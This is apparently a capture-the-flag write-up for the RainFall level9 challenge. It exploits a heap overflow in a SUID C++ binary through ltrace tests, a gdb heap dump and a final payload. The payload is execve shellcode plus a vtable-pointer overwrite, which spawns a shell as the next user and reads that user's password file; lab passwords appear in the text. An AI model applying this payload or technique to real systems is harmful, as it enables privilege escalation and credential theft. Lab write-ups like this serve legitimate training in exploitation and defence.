Login as `level9`.
```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.0.30 -p 4242 -l level9
level8@192.168.0.30's password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
A `SUID` executable is located in the home directory.
```shell
level9@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

```shell
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$ ltrace ./level9 `python -c "print 'a'*108"`
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 108
memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 108) = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x61616167, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 103) +++
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$
level9@RainFall:~$ ltrace ./level9 `python -c "print 'a'*109"`
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 109
memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 109) = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```


`setAnnotation()` receives pointer to `var1` and `av[1]` and it copies content of `av[1]` on location of `var1`. But copiying of `av[1]` is not limitted, so it can overwrite space whre lying `var2`.
It call fucntion pointer `var2`



Set hook-stop to analyse heap and set breakpoints before each function call
```gdb
(gdb) break *0x08048617
Breakpoint 1 at 0x8048617
(gdb) break *0x08048629
Breakpoint 2 at 0x8048629
(gdb) break *0x08048639
Breakpoint 3 at 0x8048639
(gdb) break *0x0804864b
Breakpoint 4 at 0x804864b
(gdb) break *0x08048677
Breakpoint 5 at 0x8048677
(gdb) break *0x08048682
Breakpoint 6 at 0x8048682
(gdb) break *0x08048693
Breakpoint 7 at 0x8048693
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/64wx 0x804a000
>end
(gdb) run AAAA
Starting program: /home/user/level9/level9 AAAA
0x804a000:	Error while running hook_stop:
Cannot access memory at address 0x804a000

Breakpoint 1, 0x08048617 in main ()
(gdb) continue
Continuing.
0x804a000:	0x00000000	0x00000071	0x00000000	0x00000000 # 1st allocation of 112 bytes
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00020f91	0x00000000	0x00000000
[...]

Breakpoint 2, 0x08048629 in main ()
(gdb) continue
Continuing.                                                # N::N(var1,5)
0x804a000:	0x00000000	0x00000071	0x08048848	0x00000000 # *(var1) = &operatorPlus
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00020f91	0x00000000	0x00000000 # *(var + 104) = 5
[...]

Breakpoint 3, 0x08048639 in main ()
(gdb) continue
Continuing.
[...]
0x804a070:	0x00000005	0x00000071	0x00000000	0x00000000 # 2nd allocation of 112 bytes
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e0:	0x00000000	0x00020f21	0x00000000	0x00000000
0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000

Breakpoint 4, 0x0804864b in main ()
(gdb) continue
Continuing.                                                # N:N(var2, 6)
[...]
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000 # *(var2) = &operatorPlus
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000 # *(var2 + 104) = 6
0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000

Breakpoint 5, 0x08048677 in main ()
(gdb) continue
Continuing.
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141 # memcpy(var1+4, av1, strlen(av1))
[...]

Breakpoint 6, 0x08048682 in main ()
(gdb) x $edx
0x804a00c:	0x41414141
(gdb) continue
Continuing.
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
[...]

Breakpoint 7, 0x08048693 in main ()
(gdb) x $edx
0x804873a <_ZN1NplERS_>:	0x8be58955
(gdb) continue
Continuing.
[Inferior 1 (process 21950) exited with code 013]
0x804a000:	Error while running hook_stop:
Cannot access memory at address 0x804a000
```


```shell
level9@RainFall:~$ ./level9 $(python -c "import struct; print struct.pack('I', 0x804a010) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + struct.pack('I', 0x804a00c)")
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
